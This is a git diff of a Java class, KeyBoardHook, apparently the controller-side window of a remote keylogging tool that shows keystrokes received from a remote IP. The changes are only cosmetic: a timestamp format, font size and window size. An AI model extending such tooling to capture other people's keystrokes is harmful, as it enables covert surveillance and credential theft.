@@ -12,6 +12,8 @@ import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.io.InputStream;
 import java.net.Socket;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
 import java.util.Date;
 
 public class KeyBoardHook{
@@ -19,6 +21,7 @@ public class KeyBoardHook{
     JTextArea area1;
     public KeyBoardHook(Socket socket,String IP) throws Exception{
         this.socket = socket;
+        SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
         JDialog frame1 = new JDialog();
         InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/kb.png");
         Image image = ImageIO.read(inputStream);
@@ -30,7 +33,7 @@ public class KeyBoardHook{
         frame1.setTitle("\\\\" + IP + "-" + "键盘监听");
         area1 = new JTextArea();
         area1.setEditable(false);
-        Font font = new Font(Font.SERIF,Font.PLAIN,13);
+        Font font = new Font(Font.SERIF,Font.PLAIN,20);
         area1.setFont(font);
         JScrollPane scrollPane = new JScrollPane(area1);
         frame1.add(scrollPane,BorderLayout.CENTER);
@@ -38,12 +41,13 @@ public class KeyBoardHook{
         area1.setBackground(Color.BLACK);
         area1.setForeground(Color.green);
         area1.setEditable(false);
+        area1.append("时间" + format.format(new Date()) + ":" + "\n");
         frame1.setLocationRelativeTo(null);
-        frame1.setSize(500,300);
+        frame1.setSize(800,600);
         frame1.setVisible(true);
         button.addActionListener(a->{
             area1.append("\n");
-            area1.append(new Date() + "\n");
+            area1.append("时间"+format.format(new Date())+ ":" + "\n");
         });
         frame1.addWindowListener(new WindowAdapter() {
             @Override
